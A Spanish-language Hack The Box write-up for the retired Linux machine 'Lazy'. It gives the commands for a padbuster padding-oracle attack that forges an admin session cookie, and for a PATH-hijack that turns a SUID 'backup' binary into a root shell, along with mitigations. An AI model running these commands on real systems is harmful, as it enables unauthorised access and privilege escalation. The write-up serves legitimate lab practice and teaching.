---
machine: Lazy
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, padding-oracle, cookie, suid, path-hijack]
---

# Lazy — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La cookie de sesión está cifrada en CBC y el servidor filtra si el padding es válido. Un padding oracle permite forjar una cookie de administrador y entrar por SSH. El SUID `backup` ejecuta `cat` sin ruta absoluta y cae en PATH hijacking.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
curl -s -c cookies.txt http://lazy.htb/login
# Padding oracle sobre la cookie
padbuster http://lazy.htb/login "SESSION=<COOKIE>" 16 -cookies "SESSION=<COOKIE>"
# Tras el acceso
find / -perm -4000 -type f 2>/dev/null
strings /usr/bin/backup | grep -i cat
mkdir -p /tmp/bin && printf '#!/bin/sh\n/bin/sh\n' > /tmp/bin/cat && chmod +x /tmp/bin/cat
PATH=/tmp/bin:$PATH /usr/bin/backup
```

## Enumeración

- Aplicación Flask con login y cookie de sesión cifrada.
- Respuestas distintas ante padding válido o inválido.
- Binario SUID `backup` que llama a `cat` sin ruta absoluta.

## Acceso inicial

Se captura la cookie y se ejecuta un padding oracle para descifrarla y modificarla. Se cambia el usuario por el administrador, se firma el nuevo valor y se obtiene acceso al panel y a una clave SSH.

## Escalada de privilegios

`find / -perm -4000` muestra `backup`. `strings` revela que ejecuta `cat` sin ruta absoluta; se coloca un `cat` malicioso en `PATH` y el binario lo ejecuta como root.

## Evidencia

- Cookie forjada aceptada por el panel.
- Acceso SSH como administrador.
- `backup` con `PATH` manipulado y shell de root.

## Lecciones aprendidas

- Un padding oracle permite cifrar y modificar datos sin la clave.
- Un SUID que confía en `PATH` es ejecución de código.
- La criptografía caseera no autentica el contenido.

## Mitigación y detección

- Usar AES-GCM o firmar la cookie con HMAC.
- No revelar errores de padding.
- Usar rutas absolutas en binarios SUID y limpiar `PATH`.

## Referencias

- [0xdf — Lazy](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html)
- [OWASP — Padding Oracle](https://owasp.org/www-community/attacks/Padding_Oracle_Attack)
- [Hack The Box — Lazy](https://app.hackthebox.com/machines/lazy)
